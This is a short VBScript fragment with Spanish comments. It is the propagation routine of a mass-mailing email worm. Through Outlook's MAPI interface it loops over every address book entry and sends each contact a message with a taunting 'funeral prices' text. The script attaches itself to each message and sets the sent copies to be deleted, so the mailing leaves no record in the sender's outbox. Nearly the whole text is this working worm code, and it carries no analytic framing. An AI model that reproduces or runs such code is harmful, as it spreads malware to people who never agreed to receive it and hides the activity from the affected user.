Set Outlook = CreateObject("Outlook.Application")		'Crea el objeto Outlook
If Outlook = "Outlook" Then
Set Mapi = Outlook.GetNameSpace("MAPI")		'Llama a la librería Mapi
Set ListaDir = Mapi.AddressLists				'Obtiene las direcciones de los contactos
For Each Recipients In ListaDir				'Comienza el bucle tantas veces como direcciones
If Recipients.AddressEntries.Count <> 0 Then			'Si hay por lo menos una direccion continua
Cuenta = Recipients.AddressEntries.Count			'Establece a "Cuenta" la cantidad de direcciones que hay

For CadaUno = 1 To Cuenta
Set Vms = Outlook.CreateItem(0)				'Crea el Msg
Set Direccion = Recipients.AddressEntries(CadaUno)		'Setea en "Direccion" el e-mail que corresponda
Vms.To = Direccion.Address					'Para:
Vms.Subject = "NO estimado Bill G."				'Asunto:
Vms.Body = "Hola que tal," & vbcrlf & "Aqui le adjunto los precios para su funeral." & vbcrlf & ""	'Mensaje:
Set Adjunto = Vms.Attachments
Adjunto.Add wscript.scriptfullname				'Archivo Adjunto:
Vms.DeleteAfterSubmit = True				'Borrar después de enviar
If Vms.To <> "" Then						'Si el campo Para no está vacio
Vms.Send							'Enviar el Msg
End If
Next
End If
Next
End If
